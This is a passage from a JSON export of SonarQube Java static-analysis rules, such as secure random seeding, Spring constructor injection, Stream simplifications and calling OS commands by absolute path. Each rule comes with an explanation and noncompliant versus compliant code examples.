sr.next(32);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nSecureRandom sr = new SecureRandom();\nint v = sr.next(32);\n</pre>\n<p>This solution is available for JDK 1.8 and higher.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nSecureRandom sr = SecureRandom.getInstanceStrong();\nint v = sr.next(32);\n</pre>\n<h3>How does this work?</h3>\n<p>When the randomly generated data needs to be cryptographically strong, <code>SecureRandom</code> is the correct class to use. However, its\ndocumentation also cites that \"any seed material passed to a <code>SecureRandom</code> object must be unpredictable\". When no seed is passed by the\nuser to the object, the <code>SecureRandom</code> object chooses an unpredictable seed by default. Therefore, the easiest way to fix the issue is to\nuse the default constructor without any calls to <code>SecureObject.setSeed()</code>.</p>\n<p>To go the extra mile, <code>SecureObject.getInstanceStrong()</code> returns an instance of <code>SecureObject</code> that is guaranteed to use a\nstrong algorithm for its number generation.</p>\n<p>If the randomly generated data is not used for cryptographic purposes and is not business critical, it may be a better choice to use\n<code>java.util.Random</code> instead. In this case, setting a predictable seed may be acceptable depending on the situation.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/security/SecureRandom.html\">Class\n  <code>java.security.SecureRandom</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/332\">CWE-332 - Insufficient Entropy in PRNG</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/336\">CWE-336 - Same Seed in Pseudo-Random Number Generator (PRNG)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/337\">CWE-337 - Predictable Seed in Pseudo-Random Number Generator (PRNG)</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded\">CERT, MSC63J.</a> - Ensure that\n  SecureRandom is properly seeded </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4347","summary":"Secure random number generators should not output predictable values","tags":["cwe","cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Spring <code>@Controller</code>, <code>@Service</code>, and <code>@Repository</code> classes are singletons by default, meaning only one instance\nof the class is ever instantiated in the application. Typically such a class might have a few <code>static</code> members, such as a logger, but all\nnon-static members should be managed by Spring and supplied via constructor injection rather than by field injection.</p>\n<p>This rule raise an issue when any non-<code>static</code> member of a Spring component has an injection annotation.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Controller\npublic class HelloWorld {\n\n  @Autowired\n  private String name = null; // Noncompliant\n\n}\n</pre>\n<h3>Compliant solution</h3>\n<p>As of Spring 4.3</p>\n<pre>\n@Controller\npublic class HelloWorld {\n\n  private String name = null;\n\n  HelloWorld(String name) {\n    this.name = name;\n  }\n}\n</pre>\n<p>Before Spring 4.3</p>\n<pre>\n@Controller\npublic class HelloWorld {\n\n  private String name = null;\n\n  @Autowired\n  HelloWorld(String name) {\n    this.name = name;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4288","summary":"Spring components should use constructor injection","tags":["spring","design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The <code>java.util.function</code> package provides a large array of functional interface definitions for use in lambda expressions and method\nreferences. In general it is recommended to use the more specialised form to avoid auto-boxing. For instance <code>IntFunction&lt;Foo&gt;</code>\nshould be preferred over <code>Function&lt;Integer, Foo&gt;</code>.</p>\n<p>This rule raises an issue when any of the following substitution is possible:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Current Interface</th>\n      <th>Preferred Interface</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p><code>Function&lt;Integer, R&gt;</code></p></td>\n      <td><p><code>IntFunction&lt;R&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;Long, R&gt;</code></p></td>\n      <td><p><code>LongFunction&lt;R&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;Double, R&gt;</code></p></td>\n      <td><p><code>DoubleFunction&lt;R&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;Double,Integer&gt;</code></p></td>\n      <td><p><code>DoubleToIntFunction</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;Double,Long&gt;</code></p></td>\n      <td><p><code>DoubleToLongFunction</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;Long,Double&gt;</code></p></td>\n      <td><p><code>LongToDoubleFunction</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;Long,Integer&gt;</code></p></td>\n      <td><p><code>LongToIntFunction</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;R,Integer&gt;</code></p></td>\n      <td><p><code>ToIntFunction&lt;R&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;R,Long&gt;</code></p></td>\n      <td><p><code>ToLongFunction&lt;R&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;R,Double&gt;</code></p></td>\n      <td><p><code>ToDoubleFunction&lt;R&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;T,T&gt;</code></p></td>\n      <td><p><code>UnaryOperator&lt;T&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>BiFunction&lt;T,T,T&gt;</code></p></td>\n      <td><p><code>BinaryOperator&lt;T&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Consumer&lt;Integer&gt;</code></p></td>\n      <td><p><code>IntConsumer</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Consumer&lt;Double&gt;</code></p></td>\n      <td><p><code>DoubleConsumer</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Consumer&lt;Long&gt;</code></p></td>\n      <td><p><code>LongConsumer</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>BiConsumer&lt;T,Integer&gt;</code></p></td>\n      <td><p><code>ObjIntConsumer&lt;T&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>BiConsumer&lt;T,Long&gt;</code></p></td>\n      <td><p><code>ObjLongConsumer&lt;T&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>BiConsumer&lt;T,Double&gt;</code></p></td>\n      <td><p><code>ObjDoubleConsumer&lt;T&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Predicate&lt;Integer&gt;</code></p></td>\n      <td><p><code>IntPredicate</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Predicate&lt;Double&gt;</code></p></td>\n      <td><p><code>DoublePredicate</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Predicate&lt;Long&gt;</code></p></td>\n      <td><p><code>LongPredicate</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Supplier&lt;Integer&gt;</code></p></td>\n      <td><p><code>IntSupplier</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Supplier&lt;Double&gt;</code></p></td>\n      <td><p><code>DoubleSupplier</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Supplier&lt;Long&gt;</code></p></td>\n      <td><p><code>LongSupplier</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Supplier&lt;Boolean&gt;</code></p></td>\n      <td><p><code>BooleanSupplier</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>UnaryOperator&lt;Integer&gt;</code></p></td>\n      <td><p><code>IntUnaryOperator</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>UnaryOperator&lt;Double&gt;</code></p></td>\n      <td><p><code>DoubleUnaryOperator</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>UnaryOperator&lt;Long&gt;</code></p></td>\n      <td><p><code>LongUnaryOperator</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>BinaryOperator&lt;Integer&gt;</code></p></td>\n      <td><p><code>IntBinaryOperator</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>BinaryOperator&lt;Long&gt;</code></p></td>\n      <td><p><code>LongBinaryOperator</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>BinaryOperator&lt;Double&gt;</code></p></td>\n      <td><p><code>DoubleBinaryOperator</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>Function&lt;T, Boolean&gt;</code></p></td>\n      <td><p><code>Predicate&lt;T&gt;</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>BiFunction&lt;T,U,Boolean&gt;</code></p></td>\n      <td><p><code>BiPredicate&lt;T,U&gt;</code></p></td>\n    </tr>\n  </tbody>\n</table>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Foo implements Supplier&lt;Integer&gt; {  // Noncompliant\n    @Override\n    public Integer get() {\n      // ...\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Foo implements IntSupplier {\n\n  @Override\n  public int getAsInt() {\n    // ...\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4276","summary":"Functional Interfaces should be as specialised as possible","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Getters and setters provide a way to enforce encapsulation by providing <code>public</code> methods that give controlled access to\n<code>private</code> fields. However, in classes with multiple fields, it is not unusual that copy and paste is used to quickly create the needed\ngetters and setters, which can result in the wrong field being accessed by a getter or setter.</p>\n<p>This rule raises an issue in any of these cases:</p>\n<ul>\n  <li> A setter does not update the field with the corresponding name. </li>\n  <li> A getter does not access the field with the corresponding name. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nclass A {\n  private int x;\n  private int y;\n\n  public void setX(int val) { // Noncompliant: field 'x' is not updated\n    this.y = val;\n  }\n\n  public int getY() { // Noncompliant: field 'y' is not used in the return value\n    return this.x;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass A {\n  private int x;\n  private int y;\n\n  public void setX(int val) {\n    this.x = val;\n  }\n\n  public int getY() {\n    return this.y;\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-4275","summary":"Getters and setters should access the expected fields","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>An <code>assert</code> is inappropriate for parameter validation because assertions can be disabled at runtime in the JVM, meaning that a bad\noperational setting would completely eliminate the intended checks. Further, <code>assert</code>s that fail throw <code>AssertionError</code>s, rather\nthan throwing some type of <code>Exception</code>. Throwing <code>Error</code>s is completely outside of the normal realm of expected\n<code>catch</code>/<code>throw</code> behavior in normal programs.</p>\n<p>This rule raises an issue when a <code>public</code> method uses one or more of its parameters with <code>assert</code>s.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n public void setPrice(int price) {\n  assert price &gt;= 0 &amp;&amp; price &lt;= MAX_PRICE;\n  // Set the price\n }\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n public void setPrice(int price) {\n  if (price &lt; 0 || price &gt; MAX_PRICE) {\n    throw new IllegalArgumentException(\"Invalid price: \" + price);\n  }\n  // Set the price\n }\n</pre>\n<h2>Resources</h2>\n<p><a href=\"https://docs.oracle.com/javase/7/docs/technotes/guides/language/assert.html\">Programming With Assertions</a></p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4274","summary":"Asserts should not be used to check the parameters of a public method","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When using the <code>Stream</code> API, call chains should be simplified as much as possible to improve readability and maintainability.</p>\n<p>This rule raises an issue when one of the following substitution can be made:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Original</th>\n      <th>Preferred</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p><code>stream.collect(counting())</code></p></td>\n      <td><p><code>stream.count()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.collect(maxBy(comparator))</code></p></td>\n      <td><p><code>stream.max(comparator)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.collect(minBy(comparator))</code></p></td>\n      <td><p><code>stream.min(comparator)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.collect(mapping(mapper))</code></p></td>\n      <td><p><code>stream.map(mapper).collect()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.collect(reducing(...))</code></p></td>\n      <td><p><code>stream.reduce(...)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.collect(summingInt(mapper))</code></p></td>\n      <td><p><code>stream.mapToInt(mapper).sum()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.collect(summingLong(mapper))</code></p></td>\n      <td><p><code>stream.mapToLong(mapper).sum()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.collect(summingDouble(mapper))</code></p></td>\n      <td><p><code>stream.mapToDouble(mapper).sum()</code></p></td>\n    </tr>\n  </tbody>\n</table>\n<h3>Noncompliant code example</h3>\n<pre>\nint count = stream.collect(counting());  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint count = stream.count();\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4266","summary":"\"Stream.collect()\" calls should not be redundant","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>java.util.regex.Pattern.compile()</code> methods have a significant performance cost, and therefore should be used sensibly.</p>\n<p>Moreover they are the only mechanism available to create instances of the Pattern class, which are necessary to do any pattern matching using\nregular expressions. Unfortunately that can be hidden behind convenience methods like <code>String.matches()</code> or\n<code>String.split()</code>.</p>\n<p>It is therefore somewhat easy to inadvertently repeatedly compile the same regular expression at great performance cost with no valid reason.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> A <code>Pattern</code> is compiled from a <code>String</code> literal or constant and is not stored in a static final reference. </li>\n  <li> <code>String.matches</code>, <code>String.split</code>, <code>String.replaceAll</code> or <code>String.replaceFirst</code> are invoked with a\n  <code>String</code> literal or constant. In which case the code should be refactored to use a <code>java.util.regex.Pattern</code> while respecting\n  the previous rule. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void doingSomething(String stringToMatch) {\n  Pattern regex = Pattern.compile(\"myRegex\");  // Noncompliant\n  Matcher matcher = regex.matcher(\"s\");\n  // ...\n  if (stringToMatch.matches(\"myRegex2\")) {  // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nprivate static final Pattern myRegex = Pattern.compile(\"myRegex\");\nprivate static final Pattern myRegex2 = Pattern.compile(\"myRegex2\");\n\npublic void doingSomething(String stringToMatch) {\n  Matcher matcher = myRegex.matcher(\"s\");\n  // ...\n  if (myRegex2.matcher(stringToMatch).matches()) {\n    // ...\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<p><code>String.split</code> doesnât create a regex when the string passed as argument meets either of these 2 conditions:</p>\n<ul>\n  <li> It is a one-char String and this character is not one of the RegExâs meta characters \".$|()[{^?*+\\\" </li>\n  <li> It is a two-char String and the first char is the backslash and the second is not the ascii digit or ascii letter. </li>\n</ul>\n<p>In which case no issue will be raised.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4248","summary":"Regex patterns should not be created needlessly","tags":["regex","performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Thereâs no need to null test in conjunction with an <code>instanceof</code> test. <code>null</code> is not an <code>instanceof</code> anything, so\na null check is redundant.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif (x != null &amp;&amp; x instanceof MyClass) { ... }  // Noncompliant\n\nif (x == null || ! x instanceof MyClass) { ... } // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif (x instanceof MyClass) { ... }\n\nif (! x instanceof MyClass) { ... }\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4201","summary":"Null checks should not be used with \"instanceof\"","tags":["redundant"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all local, <code>final</code>, initialized, primitive\nvariables, have names that match a provided regular expression.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>\n<pre>\npublic void doSomething() {\n  final int local = 42;\n  ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void doSomething() {\n  final int LOCAL = 42;\n  ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4174","summary":"Local constants should follow naming conventions for constants","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The transitive property says that if <code>a == b</code> and <code>b == c</code>, then <code>a == c</code>. In such cases, thereâs no point in\nassigning <code>a</code> to <code>c</code> or vice versa because theyâre already equivalent.</p>\n<p>This rule raises an issue when an assignment is useless because the assigned-to variable already holds the value on all execution paths.</p>\n<h3>Noncompliant code example</h3>\n<pre>\na = b;\nc = a;\nb = c; // Noncompliant: c and b are already the same\n</pre>\n<h3>Compliant solution</h3>\n<pre>\na = b;\nc = a;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4165","summary":"Assignments should not be redundant","tags":["redundant","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Two methods having the same implementation are suspicious. It might be that something else was intended. Or the duplication is intentional, which\nbecomes a maintenance burden.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate final static String CODE = \"bounteous\";\n\npublic String calculateCode() {\n  doTheThing();\n  return CODE;\n}\n\npublic String getName() {  // Noncompliant: duplicates calculateCode\n  doTheThing();\n  return CODE;\n}\n</pre>\n<p>If the identical logic is intentional, the code should be refactored to avoid duplication. For example, by having both methods call the same method\nor by having one implementation invoke the other.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate final static String CODE = \"bounteous\";\n\npublic String getCode() {\n  doTheThing();\n  return CODE;\n}\n\npublic String getName() { // The intent is clear\n  return getCode();\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Methods that are not accessors (getters and setters), with fewer than 2 statements are ignored.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-4144","summary":"Methods should not have identical implementations","tags":["confusing","duplicate","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"DISTINCT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Storing a value inside a collection at a given key or index and then unconditionally overwriting it without reading the initial value is a case of\na \"dead store\".</p>\n<pre>\nletters.put(\"a\", \"Apple\");\nletters.put(\"a\", \"Boy\");  // Noncompliant\n\ntowns[i] = \"London\";\ntowns[i] = \"Chicago\";  // Noncompliant\n</pre>\n<p>This practice is redundant and will cause confusion for the reader. More importantly, it is often an error and not what the developer intended to\ndo.</p>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4143","summary":"Map values should not be replaced unconditionally","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Java 7âs try-with-resources structure automatically handles closing the resources that the <code>try</code> itself opens. Thus, adding an explicit\n<code>close()</code> call is redundant and potentially confusing.</p>\n<h3>Noncompliant code example</h3>\n<pre>\ntry (PrintWriter writer = new PrintWriter(process.getOutputStream())) {\n  String contents = file.contents();\n  writer.write(new Gson().toJson(new MyObject(contents)));\n  writer.flush();\n  writer.close();  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\ntry (PrintWriter writer = new PrintWriter(process.getOutputStream())) {\n  String contents = file.contents();\n  writer.write(new Gson().toJson(new MyObject(contents)));\n  writer.flush();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4087","summary":"\"close()\" calls should not be redundant","tags":["redundant"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Java 8 introduced <code>ThreadLocal.withInitial</code> which is a simpler alternative to creating an anonymous inner class to initialise a\n<code>ThreadLocal</code> instance.</p>\n<p>This rule raises an issue when a <code>ThreadLocal</code> anonymous inner class can be replaced by a call to\n<code>ThreadLocal.withInitial</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal =\n    new ThreadLocal&lt;List&lt;String&gt;&gt;() { // Noncompliant\n        @Override\n        protected List&lt;String&gt; initialValue() {\n            return new ArrayList&lt;String&gt;();\n        }\n    };\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal = ThreadLocal.withInitial(ArrayList::new);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4065","summary":"\"ThreadLocal.withInitial\" should be preferred","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When <code>java.io.File#delete</code> fails, this <code>boolean</code> method simply returns <code>false</code> with no indication of the cause. On\nthe other hand, when <code>java.nio.file.Files#delete</code> fails, this <code>void</code> method returns one of a series of exception types to better\nindicate the cause of the failure. And since more information is generally better in a debugging situation, <code>java.nio.file.Files#delete</code> is\nthe preferred option.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void cleanUp(Path path) {\n  File file = new File(path);\n  if (!file.delete()) {  // Noncompliant\n    //...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void cleanUp(Path path) throws NoSuchFileException, DirectoryNotEmptyException, IOException {\n  Files.delete(path);\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4042","summary":"\"java.nio.Files#delete\" should be preferred","tags":["error-handling","api-design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>When you run an OS command, it is always important to protect yourself against the risk of accidental or malicious replacement of the executables\nin the production system.</p>\n<p>To do so, it is important to point to the specific executable that should be used.</p>\n<p>For example, if you call <code>git</code> (without specifying a path), the operating system will search for the executable in the directories\nspecified in the <code>PATH</code> environment variable.<br> An attacker could have added, in a permissive directory covered by <code>PATH</code> ,\nanother executable called <code>git</code>, but with a completely different behavior, for example exfiltrating data or exploiting a vulnerability in\nyour own code.</p>\n<p>However, by calling <code>/usr/bin/git</code> or <code>../git</code> (relative path) directly, the operating system will always use the intended\nexecutable.<br> Note that you still need to make sure that the executable is not world-writeable and potentially overwritten. This is not the scope of\nthis rule.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The PATH environment variable only contains fixed, trusted directories. </li>\n</ul>\n<p>There is a risk if you answered no to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>If you wish to rely on the <code>PATH</code> environment variable to locate the OS command, make sure that each of its listed directories is fixed,\nnot susceptible to change, and not writable by unprivileged users.</p>\n<p>If you determine that these folders cannot be altered, and that you are sure that the program you intended to use will be used, then you can\ndetermine that these risks are under your control.</p>\n<p>A good practice you can use is to also hardcode the <code>PATH</code> variable you want to use, if you can do so in the framework you use.</p>\n<p>If the previous recommendations cannot be followed due to their complexity or other requirements, then consider using the absolute path of the\ncommand instead.</p>\n<pre>\n$ whereis git\ngit: /usr/bin/git /usr/share/man/man1/git.1.gz\n$ ls -l /usr/bin/git\n-rwxr-xr-x 1 root root 3376112 Jan 28 10:13 /usr/bin/git\n</pre>\n<h2>Sensitive Code Example</h2>\n<p>The full path of the command is not specified and thus the executable will be searched in all directories listed in the <code>PATH</code>\nenvironment variable:</p>\n<pre>\nRuntime.getRuntime().exec(\"make\");  // Sensitive\nRuntime.getRuntime().exec(new String[]{\"make\"});  // Sensitive\n\nProcessBuilder builder = new ProcessBuilder(\"make\");  // Sensitive\nbuilder.command(\"make\");  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>The command is defined by its full path:</p>\n<pre>\nRuntime.getRuntime().exec(\"/usr/bin/make\");\nRuntime.getRuntime().exec(new String[]{\"~/bin/make\"});\n\nProcessBuilder builder = new ProcessBuilder(\"./bin/make\");\nbuilder.command(\"../bin/make\");\nbuilder.command(Arrays.asList(\"..\\bin\\make\", \"-j8\"));\n\nbuilder = new ProcessBuilder(Arrays.asList(\".\\make\"));\nbuilder.command(Arrays.asList(\"C:\\bin\\make\", \"-j8\"));\nbuilder.command(Arrays.asList(\"\\\\SERVER\\bin\\make\"));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> 